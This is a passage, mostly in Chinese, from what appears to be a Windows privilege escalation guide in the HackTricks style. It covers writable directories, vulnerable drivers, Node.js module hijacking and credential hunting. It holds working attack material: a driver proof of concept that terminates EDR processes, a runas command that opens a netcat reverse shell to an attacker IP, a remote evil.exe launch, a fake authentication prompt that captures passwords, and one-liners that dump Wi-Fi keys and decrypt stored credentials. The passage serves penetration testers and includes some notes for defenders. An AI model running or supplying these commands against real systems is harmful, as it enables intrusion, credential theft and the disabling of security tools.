icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ 会自动加载其 `plugins` 子文件夹下的任何 plugin DLL。 如果存在可写的 portable/copy install，放入一个恶意 plugin 就会在每次启动时于 `notepad++.exe` 内部自动执行 code（包括从 `DllMain` 和 plugin callbacks 中执行）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**检查你是否可以覆盖某个会被另一个 user 执行的 registry 或 binary。**\
**阅读** **以下页面**，了解更多有助于提升权限的有趣 **autoruns locations**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

查找可能的 **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果一个 driver 暴露了任意 kernel 读/写 primitive（在设计糟糕的 IOCTL handler 中很常见），你可以通过直接从 kernel memory 窃取一个 SYSTEM token 来提权。逐步技术见这里：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于 race-condition bug，如果 vulnerable call 会打开一个攻击者控制的 Object Manager path，故意放慢查找过程（使用最大长度组件或深目录链）可以把窗口从微秒拉长到几十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

现代 hive 漏洞允许你构造可预测布局，滥用可写的 HKLM/HKU 后代项，并在不需要 custom driver 的情况下把 metadata corruption 转换为 kernel paged-pool overflow。完整链路见这里：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

一些 driver 接受来自 userland 的 registry path，只验证它是一个正常的 UTF-16 字符串，然后调用 `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`，并使用 `RTL_QUERY_REGISTRY_DIRECT` 写入栈上的标量，例如 `int readValue`。如果缺少 `RTL_QUERY_REGISTRY_TYPECHECK`，`EntryContext` 会按照 **实际** 的 registry type 进行解释，而不是开发者预期的类型。

这会产生两个有用的 primitive：

- **Confused deputy / oracle**：用户控制的绝对 `\Registry\...` path 让 driver 可以查询攻击者选择的 key，通过返回码/logs 泄露是否存在，并且有时还能读取调用者无法直接访问的值。
- **Kernel memory corruption**：像 `&readValue` 这样的标量目标会根据 registry value type 发生 type confusion，可能被当成 `REG_QWORD`、`UNICODE_STRING` 或定长 binary buffer。

实战利用说明：

- **Windows 8+ mitigation**：如果查询命中了一个 **untrusted hive**，并且使用了 `RTL_QUERY_REGISTRY_DIRECT` 但没有 `RTL_QUERY_REGISTRY_TYPECHECK`，kernel caller 会崩溃并触发 `KERNEL_SECURITY_CHECK_FAILURE (0x139)`。为了保持可利用性，应优先寻找 **trusted system hives 中攻击者可写的 key**，而不是把值放在 `HKCU` 下进行 staging。
- **Trusted-hive staging**：使用 NtObjectManager 枚举 `\Registry\Machine` 下可写的后代项，并用一个复制的 **low-integrity** token 重新运行扫描，以找到从 sandboxed context 可达的 key：
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8 字节直接写入 4 字节 `int` 会破坏相邻的栈数据，并且可能部分覆盖附近的 callback/function pointer。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode 期望 `EntryContext` 指向一个 `UNICODE_STRING`。如果代码先把攻击者控制的 `REG_DWORD` 读入栈上的标量变量，然后又把同一个缓冲区复用于字符串读取，攻击者就能控制 `Length`/`MaximumLength`，并部分影响 `Buffer` 指针，从而得到一个半可控的 kernel write。
- **`REG_BINARY`**: 对于大二进制数据，direct mode 会把 `EntryContext` 处的第一个 `LONG` 当作有符号的缓冲区大小。如果前一次 `REG_DWORD` 读取留下了一个**负数**且由攻击者控制的值在复用的标量里，下一次 `REG_BINARY` 查询就会把攻击者字节直接复制到相邻的栈槽中，这通常是完整覆盖 callback pointer 的最干净路径。

强力狩猎模式：**对同一个栈变量进行异构 registry 读取，但没有重新初始化它**。搜索 `RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、复用的 `EntryContext` 指针，以及首个 registry 读取决定是否执行第二次读取的代码路径。

#### 利用设备对象上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些已签名的第三方驱动会通过 IoCreateDeviceSecure 使用强 SDDL 创建 device object，但却忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有这个标志时，当通过包含额外组件的路径打开设备对象时，不会强制执行 secure DACL，这会让任何低权限用户都能通过如下 namespace path 获取句柄：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（来自真实世界案例）

一旦用户可以打开该设备，驱动暴露的特权 IOCTL 就可能被滥用来进行 LPE 和篡改。现实中观察到的能力示例包括：
- 返回任意进程的 full-access handles（通过 DuplicateTokenEx/CreateProcessAsUser 进行 token theft / SYSTEM shell）。
- 不受限制的原始磁盘读写（离线篡改、boot-time persistence 技巧）。
- 终止任意进程，包括 Protected Process/Light（PP/PPL），从而允许从 user land 通过 kernel 执行 AV/EDR kill。

最小 PoC 模式（user mode）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
开发者的缓解措施
- 在创建旨在由 DACL 限制的 device objects 时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 为特权操作验证 caller context。在允许 process termination 或 handle returns 之前，添加 PP/PPL 检查。
- 限制 IOCTLs（access masks、METHOD_*、输入验证），并考虑使用 brokered models，而不是直接授予 kernel privileges。

防御者的检测思路
- 监控 user-mode 对可疑 device names 的打开（例如，\\ .\\amsdk*）以及表明滥用的特定 IOCTL 序列。
- 强制执行 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护你自己的 allow/deny lists。


## PATH DLL Hijacking

如果你对 PATH 中某个文件夹具有 **write permissions**，你可能能够劫持某个 process 加载的 DLL，并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 通过 `C:\node_modules` 劫持 Node.js / Electron 模块解析

这是一个 **Windows uncontrolled search path** 变体，影响 **Node.js** 和 **Electron** 应用程序，当它们执行类似 `require("foo")` 这样的裸导入，并且预期的模块 **缺失** 时。

Node 通过沿着目录树向上遍历，并检查每个父目录中的 `node_modules` 文件夹来解析包。在 Windows 上，这个遍历可能一直到达磁盘根目录，因此从 `C:\Users\Administrator\project\app.js` 启动的应用最终可能会探测：

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

如果一个 **低权限用户** 能创建 `C:\node_modules`，他们就可以放置一个恶意的 `foo.js`（或 package 文件夹），然后等待一个 **更高权限的 Node/Electron 进程** 去解析这个缺失的依赖。payload 会在受害进程的安全上下文中执行，因此只要目标以管理员身份运行、来自提权的计划任务/服务包装器，或者来自自动启动的高权限桌面应用，这就会成为 **LPE**。

这种情况尤其常见于以下场景：

- 依赖项被声明在 `optionalDependencies` 中
- 第三方库把 `require("foo")` 包在 `try/catch` 中，并在失败后继续执行
- 某个 package 在生产构建中被移除、在打包时被省略，或者安装失败
- 存在漏洞的 `require()` 深藏在依赖树中，而不是位于主应用代码里

### 寻找有漏洞的目标

使用 **Procmon** 来证明解析路径：

- 过滤 `Process Name` = 目标可执行文件（`node.exe`、Electron 应用 EXE，或包装进程）
- 过滤 `Path` `contains` `node_modules`
- 重点关注 `NAME NOT FOUND` 以及在 `C:\node_modules` 下最终成功打开的项

在解包后的 `.asar` 文件或应用源代码中，有用的代码审查模式：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### 利用

1. 从 Procmon 或源代码审查中识别**缺失的包名称**。
2. 如果根查找目录不存在，则创建它：
```powershell
mkdir C:\node_modules
```
3. 使用完全符合预期名称的模块进行投放：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 触发受害应用程序。如果该应用程序尝试 `require("foo")` 且合法模块不存在，Node 可能会加载 `C:\node_modules\foo.js`。

符合此模式的真实世界缺失可选模块示例包括 `bluebird` 和 `utf-8-validate`，但**technique** 才是可复用的部分：找到任何一个**缺失的 bare import**，让有特权的 Windows Node/Electron 进程去解析它。

### 检测和加固思路

- 当用户创建 `C:\node_modules` 或在其中写入新的 `.js` 文件/packages 时发出告警。
- 排查高完整性进程从 `C:\node_modules\*` 读取的行为。
- 在生产环境中把所有运行时依赖打包，并审计 `optionalDependencies` 的使用。
- 审查第三方代码中静默的 `try { require("...") } catch {}` 模式。
- 如果库支持，禁用可选探测（例如，某些 `ws` 部署可以通过 `WS_NO_UTF_8_VALIDATE=1` 避免旧的 `utf-8-validate` 探测）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否硬编码了其他已知电脑
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

从外部检查 **restricted services**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**查看此页面以了解与防火墙相关的命令**](../basic-cmd-for-pentesters.md#firewall) **（列出规则、创建规则、关闭、关闭...）**

[更多用于网络枚举的命令在这里](../basic-cmd-for-pentesters.md#network)

### Linux 的 Windows 子系统 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到

如果你获得 root 用户权限，你可以监听任意端口（第一次使用 `nc.exe` 监听端口时，它会通过 GUI 询问是否允许防火墙放行 `nc`）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以 root 启动 bash，你可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

来自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用户用于服务器、网站和其他程序的凭据，这些程序是 **Windows** 可以自动为用户 **log in** 的。乍一看，这似乎意味着用户现在可以存储他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等，这样浏览器就可以自动登录它们。但事实并非如此。

Windows Vault 存储的是 Windows 可以自动为用户登录所需的凭据，这意味着任何 **Windows application that needs credentials to access a resource**（服务器或网站）都**可以使用这个 Credential Manager** 和 Windows Vault，并使用提供的凭据，而不是让用户一直输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们不可能使用某个资源的凭据。因此，如果你的应用程序想要使用 vault，它应该以某种方式**与 credential manager 通信，并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 的 `/savecred` 选项来使用已保存的凭据。以下示例通过 SMB share 调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 搭配提供的一组凭据。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** 提供一种对数据进行对称加密的方法，主要用于 Windows 操作系统中对非对称私钥进行对称加密。此加密会利用用户或系统 secret，从而显著增加熵。

**DPAPI 允许通过从用户登录 secrets 派生出的对称密钥来加密密钥**。在涉及系统加密的场景中，它使用系统的域认证 secrets。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**与保护用户私钥的 master key 一起位于同一个文件中的 DPAPI key**，通常由 64 字节的随机数据组成。（需要注意的是，该目录的访问是受限的，因此无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey`，配合相应参数（`/pvk` 或 `/rpc`）来解密它。

**credentials files protected by the master password** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
你可以使用 `sekurlsa::dpapi` 模块从**内存**中**提取大量 DPAPI** **masterkeys**（如果你是 root）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 通常用于**脚本编写**和自动化任务，作为一种方便存储加密凭据的方式。该凭据受 **DPAPI** 保护，这通常意味着它们只能由创建它们的同一用户、在同一台计算机上解密。

要从包含它的文件中**解密**一个 PS credentials，你可以这样做：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 中找到它们

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面 Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在 .\
安装程序会以 **SYSTEM privileges** 运行，许多都容易受到 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（Credentials）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### registry 中的 SSH keys

SSH private keys 可以存储在 registry key `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查这里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中找到任何条目，它很可能是一个已保存的 SSH key。它是以加密形式存储的，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 很容易解密。\
关于该技术的更多信息，请看这里: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务没有运行，而你希望它在启动时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个 technique 已经不再有效了。我尝试创建一些 ssh keys，用 `ssh-add` 添加它们，并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，而且 procmon 也没有识别在 asymmetric key authentication 期间对 `dpapi.dll` 的使用。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭据
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP Pasword

以前有一个功能，可以通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员账户。然而，这种方法存在严重的安全缺陷。首先，存储在 SYSVOL 中的 XML 文件形式的 Group Policy Objects (GPOs) 可被任何域用户访问。其次，这些 GPP 中的密码使用 AES256 加密，并采用公开记录的默认密钥，任何经过认证的用户都可以解密。这带来了严重风险，因为它可能让用户获得提升的权限。

为缓解这一风险，开发了一个函数用于扫描本地缓存的 GPP 文件，其中包含一个非空的 "cpassword" 字段。找到此类文件后，该函数会解密密码并返回一个自定义的 PowerShell 对象。此对象包含 GPP 的详细信息以及文件位置，有助于识别和修复这一安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 中搜索这些文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
含有凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 索要凭据

你总是可以**要求用户输入他的凭据，甚至是另一个用户的凭据**，如果你认为他可能知道这些凭据（注意，**直接**向客户端**索要凭据**是非常**危险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭证的文件名**

一些已知文件，曾经包含以 **明文** 或 **Base64** 形式存储的 **passwords**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
请搜索所有提议的文件：
```
